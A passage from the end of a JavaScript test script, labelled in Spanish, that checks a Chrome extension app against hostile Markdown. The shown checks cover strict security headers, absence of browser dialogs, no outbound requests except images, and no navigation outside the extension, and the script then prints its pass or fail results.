  ['sitio publicado: las cabeceras no dejan enmarcar la página ni adivinar el tipo', !!sitio.cabeceras && /frame-ancestors 'none'/.test(sitio.cabeceras['content-security-policy']) && /default-src 'none'/.test(sitio.cabeceras['content-security-policy']) && !/unsafe-inline|unsafe-eval|\*/.test(sitio.cabeceras['content-security-policy']) && sitio.cabeceras['x-frame-options'] === 'DENY' && sitio.cabeceras['x-content-type-options'] === 'nosniff' && sitio.log === false, sitio.cabeceras],
  ['ninguna carga abre un diálogo del navegador', dialogs.length === 0, dialogs],
  ['no sale ningún pedido a otro servidor que no sea una imagen', odd.length === 0, odd],
  ['no navega fuera de la app', new URL(o.url1).protocol === 'chrome-extension:' && new URL(app.url()).protocol === 'chrome-extension:', [o.url1, app.url()]],
];
console.log('Markdown hostil');
checks.forEach(([name, ok, detail]) => console.log((ok ? '  ok   ' : '  FALLA ') + name + (ok || detail === undefined ? '' : '  -> ' + JSON.stringify(detail).slice(0, 500))));
const bad = checks.filter((c) => !c[1]).length;
console.log('\n' + (checks.length - bad) + ' de ' + checks.length + ' pruebas pasaron');
await ctx.close(); fs.rmSync(profile, { recursive: true, force: true }); process.exit(bad ? 1 : 0);
